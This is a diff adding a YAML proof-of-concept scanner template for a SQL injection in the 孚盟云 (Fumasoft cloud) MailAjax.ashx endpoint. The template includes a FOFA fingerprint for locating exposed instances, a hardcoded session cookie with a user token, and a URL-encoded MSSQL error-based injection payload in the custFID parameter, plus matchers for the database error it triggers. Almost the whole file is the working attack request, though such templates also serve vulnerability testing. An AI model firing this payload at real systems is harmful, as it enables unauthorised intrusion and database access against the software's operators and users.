@@ -1,0 +1,27 @@
+id: poc-yaml-fumasoft-mailajax-ashx-sqli
+info:
+  name: 孚盟云 MailAjax.ashx SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  - 两高一弱
+  finger: 孚盟云
+  fofa: app="孚盟软件-孚盟云"
+requests:
+- method: POST
+  path: /Ajax/MailAjax.ashx
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+    Cookie: UserCookie={"LicNo":"","lastLoginIp":"","LicSelected":"cloud","ProductID":"M8","loginUser":"00210","userToken":"A39418D1C5EADEFD41E99B71976A531E24EC2C6B9E7D4CD460A406769A97CC9DE2966975679C521F499A8F215B51B65C4D067F57D94D260B6EF4C16094D56562"}
+  data: action=GetMailContactsCard&custFID=%28%53%45%4c%45%43%54%20%73%79%73%2e%66%6e%5f%76%61%72%62%69%6e%74%6f%68%65%78%73%74%72%28%68%61%73%68%62%79%74%65%73%28%27%4d%44%35%27%2c%27%31%27%29%29%2b%28%43%41%53%45%20%57%48%45%4e%20%28%37%35%38%38%3d%37%35%38%38%29%20%54%48%45%4e%20%43%48%41%52%28%34%39%29%20%45%4c%53%45%20%43%48%41%52%28%34%38%29%20%45%4e%44%29%2b%43%48%41%52%28%31%31%33%29%2b%43%48%41%52%28%31%32%32%29%2b%43%48%41%52%28%31%30%36%29%2b%43%48%41%52%28%31%30%37%29%2b%43%48%41%52%28%31%31%33%29%29
+  expression: 'status_code == 500 &&
+
+    contains(body,"0xc4ca4238a0b923820dcc509a6f75849b1qzjkq") &&
+
+    contains(body,"在将 nvarchar 值") &&
+
+    contains(body,"转换成数据类型 int 时失败")
+
+    '
+variables: {}
+transport: http
